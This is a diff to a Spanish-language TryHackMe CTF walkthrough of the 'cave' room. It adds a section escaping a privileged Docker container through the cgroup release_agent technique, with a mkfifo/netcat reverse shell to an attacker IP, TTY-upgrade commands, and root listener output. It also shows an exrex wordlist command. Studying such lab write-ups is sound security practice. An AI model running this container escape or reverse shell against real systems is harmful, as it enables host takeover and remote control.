@@ -199,9 +199,9 @@ Resolviendo deltas: 100% (236/236), listo.
 ➜  inacave git:(main) ✗ cd exrex                                                              
 ➜  exrex git:(master) ls
 COPYING  doc  exrex.py  MANIFEST.in  README.md  setup.py  tests.py  tox.ini
-➜  exrex git:(master) python exrex.py -o passwords.txt "     ^ed[h#f]{3}[123]{1,2}xf[\!@#*]$"
+➜  exrex git:(master) sudo python3 exrex.py -o pass.ls "^ed[h#f]{3}[123]{1,2}xf[\!@#*]$"
 ➜  exrex git:(master) ✗ ls
-COPYING  doc  exrex.py  MANIFEST.in  passwords.txt  README.md  setup.py  tests.py  tox.ini
+COPYING  doc  exrex.py  MANIFEST.in  pass.ls  README.md  setup.py  tests.py  tox.ini
 ```
 
 ## Etapa de Intrusion
@@ -404,6 +404,8 @@ skeleton@cave:~$
 
 #### En las CTF'S que yo suelo jugar por mi experiencia siempre suelo revisar contrabs, /opt, soders, enlisto permisos. pues esta vez he encontrado un proceso de sistema llamado startcon en la ruta de /opt/link asi que lo movi a /tmp para tener permisos de escritura y asi poder agregarle una reverse shell
 
+## Etapa de Explotacion
+
 ```bash
 skeleton@cave:/tmp$ cat startcon 
 #!/bin/bash
@@ -477,3 +479,72 @@ Flag:THM{****************}
 root@cave:~# 
 ```
 
+#### esta nota que nos deja nos dice Estabas analizando la pared invisible y después de un tiempo, pudiste ver tu reflejo en la esquina de la pared.
+#### Pero no era solo como un espejo, tu reflejo podía interactuar con el mundo real, ¡había un vínculo entre ustedes dos!
+#### Y luego usaste tu reflejo para agarrar un pedacito de la raíz del árbol y lo clavaste en la pared con todas tus fuerzas.
+#### Podías sentir la cueva retumbando, como si fuera el final para ti y luego todo se volvió negro.
+#### Pero después de un tiempo, te despertaste en el mismo lugar en el que estabas antes, pero ahora no había un muro invisible que te impidiera entrar en la raíz.
+
+#### Estás en la raíz de un árbol enorme, pero tu búsqueda no ha terminado, todavía te sientes... contenido, dentro de esta cueva.
+
+#### Al principio no entendia muy bien este mensaje hasta que vi la pregunta de TryHackMe que dice "Flag Exterior" desde ese momento me di cuenta que estabamos dentro de un docker y teniamos que escapar, por eso nos dice que con nuestro reflejo habia un vinculo entre los dos pero podiamos interactuar con el, podria haber otra /? otro directorio /root? en fin 
+#### Me puse a buscar en en foros sobre como lograr salir de un contenedor privilegiado y encontre esto:
+
+[![Como salir de un dokcer privilegiado](https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1)](https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1)
+
+#### yo he editado esto un poco.. le he agregado una reverse shell como payload pero primero hagamos nuestra tty full interactiva
+
+`python -c 'import pty; pty.spawn("/bin/bash")'`
+
+`export TERM=xterm`
+
+`export SHELL=bash`
+
+#### Ctrl + Z
+
+`stty raw -echo; fg`
+
+`xterm`
+
+```bash
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+echo '#!/bin/sh' > /cmd
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.127.161 443 >/tmp/f" >> /cmd
+chmod a+x /cmd
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+```
+
+#### como ven he agregado una reverse shell pero ustedes cambiaran la ip por la suya tun0 y el puerto a su preferencia.
+#### ejecutamos eso en la terminal y con eso ya tuvimos que poder salir de el docker 
+
+```bash
+➜  ~ nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.18.127.161] from (UNKNOWN) [10.10.255.20] 33236
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cd /root
+# ls
+info.txt
+snap
+# cat info.txt
+You were looking at the tree and it was clearly magical, but you could see that the farther you went from the root, the weaker the magical energy.
+So the energy was clearly coming from the bottom, so you saw that the soil was soft, different from the rest of the cave, so you dug down.
+After digging for some time, you realized that the root stopped getting thinner, in fact it was getting thicker and thicker.
+Suddently the gravity started changing and you grabbed the nearest thing you could get a hold of, now what was up was down.
+And when you looked up you saw the same tree, but now you can see the sun, you're finally in the outside.
+
+Flag:THM{****************+*}
+# 
+```
+## Creditos:
+
+[![Twitter ~ @Darlez.Sec](https://twitter.com/DarlezSec)](https://twitter.com/DarlezSec)
+
+[![Twitter ~ @spawmnc](https://twitter.com/spxwnmc)](https://twitter.com/spxwnmc)
+
+[![Twitter ~ @Mora404](https://twitter.com/4M0R4)](https://twitter.com/4M0R4)
